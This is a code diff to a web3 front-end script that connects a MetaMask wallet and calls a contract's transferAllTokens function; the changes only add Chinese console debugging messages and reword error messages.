@@ -13,10 +13,15 @@ const abi = [
   // 其他ABI内容...
 ];
 
+// 添加调试信息: 当页面加载时打印信息
+console.log("页面加载完成，正在准备连接钱包...");
+
 // 连接钱包
 document.getElementById('connectButton').addEventListener('click', async () => {
   try {
+    console.log("连接钱包按钮已点击，开始连接钱包...");
     document.getElementById('statusMessage').textContent = "尝试连接钱包...";
+    
     if (typeof window.ethereum !== 'undefined') {
       const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
@@ -33,7 +38,7 @@ document.getElementById('connectButton').addEventListener('click', async () => {
       console.log("Metamask插件未安装或未启用");
     }
   } catch (error) {
-    console.error("连接钱包出错: ", error);
+    console.error("连接钱包时出现错误: ", error);
     document.getElementById('statusMessage').textContent = '连接钱包失败，请重试';
   }
 });
@@ -42,18 +47,24 @@ document.getElementById('connectButton').addEventListener('click', async () => {
 document.getElementById('transferButton').addEventListener('click', async () => {
   if (!userAddress || !contract) {
     alert('请先连接钱包');
-    console.log("未连接钱包，无法转移代币");
+    console.log("钱包未连接，无法转移代币");
     return;
   }
 
   try {
+    console.log("转移所有代币按钮已点击，开始执行代币转移...");
     document.getElementById('statusMessage').textContent = "执行代币转移...";
+    
+    // 打印调试信息，确保交互步骤正确
+    console.log("准备调用 transferAllTokens 函数...");
     await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
+
     alert('代币转移成功');
     document.getElementById('statusMessage').textContent = "代币转移成功";
     console.log("代币转移成功");
   } catch (error) {
-    console.error("代币转移出错: ", error);
+    console.error("代币转移时出现错误: ", error);
     document.getElementById('statusMessage').textContent = '代币转移失败，请重试';
   }
 });
+``
